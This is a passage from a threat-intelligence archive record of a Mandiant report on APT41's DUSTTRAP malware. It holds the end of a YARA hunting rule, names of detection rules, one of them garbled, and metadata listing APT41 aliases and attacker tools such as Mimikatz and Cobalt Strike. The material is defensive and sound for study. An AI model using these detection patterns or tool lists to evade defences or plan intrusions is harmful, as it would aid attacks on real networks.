\".data\" and\n\nany of ($key_*) in (pe.sections[i].raw_data_offset..\n\npe.sections[i].raw_data_offset + pe.sections[i].raw_data_size)\n\n)\n\n}\n\n\nimport \"pe\"\n\nrule M_HUNTING_DUSTTRAP_PayloadFile {\n\nmeta:\n\nauthor = \"Mandiant\"\n\n\n-----\n\ndisclaimer = \"This rule is meant for hunting and is not\n\ntested to run in a production environment.\"\n\ncondition:\n\nfor any i in (0..pe.number_of_sections - 1): (\n\nuint32(pe.sections[i].raw_data_offset + 0) == 0x100 and\n\npe.sections[i].raw_data_size > uint32\n\n(pe.sections[i].raw_data_offset + 0) and\n\npe.sections[i].name == \".lrsrc\" and\n\nuint32(pe.sections[i].raw_data_offset + 4) < 0x1000 and\n\nuint32(pe.sections[i].raw_data_offset + 8) < 4\n\n)\n\n}\n\n\n## YARA-L\n\n[If you are a Google SecOps Enterprise+ customer, rules were released to your Emerging Threats rule](https://cloud.google.com/chronicle/docs/preview/curated-detections/windows-threats-category)\n\npack, and IOCs listed in this blog post are available for prioritization with [Applied Threat Intelligence.](https://cloud.google.com/chronicle/docs/detection)\n\n### Relevant Rules\n\n\nWinRAR Command Line CSV to RAR\n\n\nSQLULDR2 Process Launch\n\n\nDUSTTRAP Process Execution and Command and Control\n\n\nDUSTTRAP Dropping Multiple Utilities\n\n\nDUSTTRAP S i A ti Obj ti P\n\n\n-----\n\nSuspected Stolen Code Signing Certificate (CCR Inc)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2024/2024.07.19.APT41_Has_Arisen_From_the_DUST/apt41-arisen-from-dust.pdf"
    ],
    "report_names": [
        "apt41-arisen-from-dust"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "4c68ccd0-caba-4189-9ead-86ac4c2d9b70",
            "created_at": "2024-05-01T02:03:07.930196Z",
            "updated_at": "2025-03-27T02:05:17.251237Z",
            "deleted_at": null,
            "main_name": "BRONZE ATLAS",
            "aliases": [
                "Axiom",
                "BARIUM ",
                "Blackfly ",
                "CTG-2633",
                "GREF",
                "Group 72 ",
                "Red Kelpie ",
                "TG-2633 ",
                "Wicked Panda ",
                "Winnti",
                "APT41 "
            ],
            "source_name": "Secureworks:BRONZE ATLAS",
            "tools": [
                " CCleaner v5.33 backdoor",
                " ChinaChopper",
                " Cobalt Strike",
                " Dicey MSDN",
                " ForkPlayground",
                " HUC Proxy Malware (Htran)",
                " Mimikatz",
                " PipeMon",
                " PlugX",
                " PortReuse",
                " Powershell Empire",
                " RCMD",
                " RbDoor",
                " SPEEDBOAT",
                " ShadowPad",
                " Sidewalk",
                " Speculoos",
                " TeamViewer",
                " Winnkit",
                " Winnti",
                " reg save",
                " vssadmin",
                "Acehash"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "4d5f939b-aea9-4a0e-8bff-003079a261ea",
            "created_at": "2023-01-06T13:46:39.04841Z",
            "updated_at": "2025-03-27T02:00:02.985296Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "G0096",
                "Grayfly",
                "BARIUM",
                "BRONZE ATLAS",
                "BRONZE EXPORT",
                "Red Kelpie",
                "HOODOO",
                "Brass Typhoon",
                "TA415",
                "WICKED SPIDER",
                "WICKED PANDA",
                "G0044",
                "Earth Baku"
            ],
            "source_name": "MISPGALAXY:APT41",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e698860d-57e8-4780-b7c3-41e5a8314ec0",
            "created_at": "2022-10-25T15:50:23.287929Z",
            "updated_at": "2025-03-27T02:00:55.43005Z",
            "deleted_at": null,
            "main_name": "APT41",
            "aliases": [
                "APT41",
                "Wicked Panda",
                "Brass Typhoon",
                "BARIUM"
            ],
            "source_name": "MITRE:APT41",
            "tools": [
                "ASPXSpy",
                "BITSAdmin",
                "PlugX",
                "Impacket",
                "gh0st RAT",
                "netstat",
                "PowerSploit",
                "ZxShell",
                "KEYPLUG",
                "ipconfig",
                "sqlmap",
                "China Chopper",
                "ShadowPad",
                "MESSAGETAP",
                "Mimikatz",
                "certutil",
                "njRAT",
                "Cobalt Strike",
                "pwdump",
                "BLACKCOFFEE",
                "ROCKBOOT",
                "dsquery",
                "Winnti for Linux",
                "DUSTTRAP",
                "Derusbi",
                "ftp"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1721959584,
    "ts_updated_at": 1743041777,
    "ts_creation_date": 1721917204,
    "ts_modification_date": 1721917204,
    "files": {
        "pdf": "https://archive.orkl.eu/afd353c869cde483bea099b7e62f5a1ca2d90245.pdf",
        "text": "https://archive.orkl.eu/afd353c869cde483bea099b7e62f5a1ca2d90245.txt",
        "img": "https://archive.orkl.eu/afd353c869cde483bea099b7e62f5a1ca2d90245.jpg"
    }
}